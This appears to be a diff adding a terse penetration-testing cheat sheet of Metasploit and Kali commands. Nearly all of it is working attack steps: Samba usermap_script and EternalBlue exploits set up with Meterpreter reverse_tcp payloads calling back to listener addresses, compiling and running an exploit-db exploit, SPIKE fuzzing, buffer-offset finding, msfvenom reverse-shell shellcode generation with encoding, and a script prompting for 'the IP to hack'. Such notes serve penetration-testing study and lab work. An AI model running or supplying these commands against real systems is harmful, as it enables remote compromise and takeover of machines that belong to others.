@@ -1,1 +1,42 @@
 
+msfconsole
+systemctl start postgresql
+msf > db_status
+msf > workspace -h
+msf > workspace -a client1
+nmap -sV -P0 targete.com -oA folder/filname
+msf > db_import filename.xml
+msf> search samba
+msf> info exploit/multi/samba/usermap_script
+msf> use exploit/multi/samba/usermap_script
+msf> exploit
+sysinfo
+sessions -i 1
+multiple payload and listeners
+            use exploit/windows/smb/ms17_010_eternalblue
+            set payload windows/x64/meterpreter/reverse_tcp
+            set rhost 192.168.0.166
+            set lhost 192.168.0.137
+            set lport 4444
+            exploit -j
+            use exploit/windows/smb/ms17_010_eternalblue
+            set payload windows/x64/meterpreter/reverse_tcp
+            set rhost 192.168.0.115
+            set lhost 192.168.0.24
+            set lport 4442
+            exploit -j  
+
+searchsploit
+root@kali:~# cp /usr/share/exploitdb/platforms/windows/remote/3996.c apache.c
+root@kali:~# gcc apache.c -o apache
+root@kali:~# ./apache  
+
+root@kali:!#/generic_send_tcp host port spike_script SKIPVAR SKIPSTR
+s_readline(); 
+s_string("SRUN |"); 
+s_string_variable("VALUE"); 
+generic_send_tcp target port exploitfuzz.spk 0 0
+root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x6F43376F -l 4000
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=192.168.0.24 lport=4444 -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
+root@kali:~# python crash.py
+enter the IP to hack:192.168.0.115
